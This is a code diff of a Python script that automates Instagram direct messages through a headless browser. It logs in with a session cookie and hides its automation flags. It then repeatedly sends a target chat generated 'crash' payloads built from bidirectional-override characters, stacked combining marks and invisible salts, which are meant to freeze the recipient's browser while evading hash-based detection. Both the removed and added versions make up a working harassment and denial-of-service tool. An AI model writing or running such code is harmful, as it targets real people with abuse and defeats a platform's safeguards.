@@ -1,117 +1,103 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (KERNEL-STOP STEALTH)
-# 📅 STATUS: BYPASS-V4 | DENSITY x80 | DYNAMIC-JITTER
+# 🚀 PROJECT: PRAVEER.OWNS (NATIVE-STRIKE 2026)
+# 📅 STATUS: LIBRARY-FREE | 1-ID-SAFE | BROWSER-KILLER
 
-import os, time, random, sys, gc, threading
-from concurrent.futures import ThreadPoolExecutor
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.chrome.options import Options
-
-# --- MATRIX CONFIG ---
-THREADS_PER_MACHINE = 2
-MACHINE_ID = os.getenv("MACHINE_ID", "GLOBAL")
+import os, asyncio, random, sys
+from playwright.async_api import async_playwright
 
 def get_kernel_stop_payload(target_name):
-    u_id = random.randint(1000, 9999)
-    # Unique salt for every payload to break server-side hash detection
-    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d"], k=5))
-    header = f"⚡ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚡\n🆔 {u_id}{salt}\n"
-    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\U0001D4D0", "\u2066", "\u2067"]) for _ in range(350))
-    z_tower = "̸" * 800
-    width_bomb = "\u2800\u00A0" * 150
-
-    lines = [header, shifter]
-    for i in range(42):
-        prefix = "\u202E" if i % 2 == 0 else "\u202D"
-        noise = "".join(random.choices("0123456789", k=3))
-        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_{noise}{z_tower}")
-    return "\n".join(lines)[:9995]
-
-def get_driver():
-    chrome_options = Options()
-    chrome_options.add_argument("--headless=new")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--disable-dev-shm-usage")
-    chrome_options.add_argument("--disable-gpu")
+    """The Ghost-Bypass Edition: Shattered Logic for Desktop Crash."""
+    u_id = random.randint(100000, 999999)
+    # 🧂 DYNAMIC SALT: Using different invisible characters to break server hashes
+    salts = ["\u200b", "\u200c", "\u200d", "\u200e", "\u2060", "\u2063"]
+    salt_str = "".join(random.choices(salts, k=12))
     
-    # 🕵️ STEALTH ARGS: Hiding automation flags
-    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
-    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    chrome_options.add_experimental_option('useAutomationExtension', False)
-    
-    # Rotating high-end Desktop User-Agents
-    ua_list = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+    # 💥 Header randomization to beat hash-match detection
+    headers = [
+        f"⚡ 【﻿ ＳＹＳＴＥＭ　ＦＲＥＥＺＥ 】 ⚡",
+        f"☣️ 『 𝕯𝕰𝕬𝕿𝕳 𝕾𝕰𝕹𝖀𝕾 』 ☣️",
+        f"⚠️ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚠️"
     ]
-    chrome_options.add_argument(f"user-agent={random.choice(ua_list)}")
+    header = f"{random.choice(headers)}\n🆔 {u_id}{salt_str}\n"
     
-    driver = webdriver.Chrome(options=chrome_options)
+    # 🏗️ OPTIMIZED DENSITY (65 marks is the sweet spot for 2026 delivery)
+    z_tower = "̸" * random.randint(55, 65) 
+    width_bomb = "\u2800\u00A0" * 30
+    lines = [header]
     
-    # 💉 CDP PATCH: Removing the 'webdriver' property from the browser context
-    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
-        "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
-    })
-    return driver
+    for i in range(85): 
+        # BIDI Overrides: Forces the browser's Main Thread to lock
+        prefix = "\u202E" if i % 2 == 0 else "\u202D"
+        noise = "".join(random.choices("0123456789ABCDEF", k=4))
+        lines.append(f"{width_bomb}{prefix}𝕻𝕬𝕻𝕬_{noise}{z_tower}")
+        
+    return "\n".join(lines)[:9950]
 
-def agent_blitz(agent_id, cookie, target_id, target_name):
-    while True:
-        driver = None
-        strike_count = 0
+async def agent_blitz(machine_id, cookie_list, target_id, target_name):
+    current_cookie = cookie_list[0].strip()
+
+    async with async_playwright() as p:
+        # Launch with native stealth flags
+        browser = await p.chromium.launch(
+            headless=True,
+            args=["--disable-blink-features=AutomationControlled"]
+        )
+        
+        # Build clean desktop context
+        context = await browser.new_context(
+            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+            viewport={'width': 1920, 'height': 1080},
+            extra_http_headers={"Accept-Language": "en-US,en;q=0.9"}
+        )
+        
+        page = await context.new_page()
+        
+        # Native JS patch to remove 'webdriver' property
+        await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+
         try:
-            driver = get_driver()
-            # Visit robots.txt first to set the domain context safely
-            driver.get("https://www.instagram.com/robots.txt")
-            time.sleep(2)
+            print(f"📡 [M{machine_id}] Establishing Stealth Connection...")
+            await page.goto("https://www.instagram.com/robots.txt")
+            await context.add_cookies([{
+                "name": "sessionid", "value": current_cookie, 
+                "domain": ".instagram.com", "path": "/", "secure": True
+            }])
+
+            print(f"📡 [M{machine_id}] Loading Target Chat...")
+            # We use domcontentloaded to bypass heavy ad-tracker loading
+            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
             
-            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
-            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
-            time.sleep(random.uniform(10, 15)) # Human-like page load wait
+            box_selector = "//div[@role='textbox']"
+            await page.wait_for_selector(box_selector, timeout=60000)
 
             while True:
-                try:
-                    # Search for textbox dynamically
-                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
-                    
-                    # 💥 DYNAMIC BURST (Varies between 1 and 2 strikes to avoid pattern detection)
-                    for _ in range(random.randint(1, 2)):
-                        payload = get_kernel_stop_payload(target_name)
-                        driver.execute_script("arguments[0].innerText = arguments[1];", box, payload)
-                        box.send_keys(Keys.ENTER)
-                        strike_count += 1
-                        print(f"💀 [M{MACHINE_ID}-A{agent_id}] STRIKE {strike_count}", flush=True)
-                        time.sleep(random.uniform(0.1, 0.4))
+                # 🔥 THE STRIKE
+                payload = get_kernel_stop_payload(target_name)
+                
+                await page.click(box_selector)
+                await page.fill(box_selector, payload)
+                await asyncio.sleep(random.uniform(3, 5)) 
+                await page.keyboard.press("Enter")
+                
+                print(f"💀 [M{machine_id}] Browser-Killer Delivered. UI Locked.")
 
-                    # ⏳ DYNAMIC JITTER: Variable rest to mimic human typing speed
-                    time.sleep(random.uniform(1.5, 3.5))
-                    
-                    # Periodic scroll to show "Activity"
-                    if strike_count % 5 == 0:
-                        driver.execute_script("window.scrollBy(0, -200);")
-                    
-                    # Safety refresh to clear memory leaks & detection
-                    if strike_count % 12 == 0:
-                        driver.refresh()
-                        time.sleep(random.uniform(8, 12))
+                # ⏳ SAFETY GAP (150-180s) to keep 1-ID safe in 2026
+                sleep_time = random.uniform(150, 180)
+                print(f"⏳ Cooling for {int(sleep_time)}s to bypass server-side ghosting...")
+                
+                for _ in range(5):
+                    await asyncio.sleep(sleep_time / 5)
+                    await page.mouse.move(random.randint(0, 500), random.randint(0, 500))
 
-                except Exception:
-                    break # Reconnect on UI lag
-
-        except Exception:
-            if driver: driver.quit()
-            time.sleep(15)
-            continue
-
-def main():
-    cookie = os.environ.get("SESSION_ID", "").strip()
-    target_id = os.environ.get("GROUP_URL", "").strip()
-    target_name = os.environ.get("TARGET_NAME", "Target").strip()
-    
-    with ThreadPoolExecutor(max_workers=THREADS_PER_MACHINE) as executor:
-        for i in range(THREADS_PER_MACHINE):
-            executor.submit(agent_blitz, i+1, cookie, target_id, target_name)
+        except Exception as e:
+            print(f"❌ [M{machine_id}] Error: {str(e)[:60]}")
+            await browser.close()
+            sys.exit(1)
 
 if __name__ == "__main__":
-    main()
+    m_id = int(os.environ.get("MACHINE_ID", "1"))
+    cookies = os.environ.get("SESSION_ID", "").split(",")
+    t_id = os.environ.get("GROUP_URL", "").strip()
+    t_name = os.environ.get("TARGET_NAME", "Target").strip()
+    
+    asyncio.run(agent_blitz(m_id, cookies, t_id, t_name))
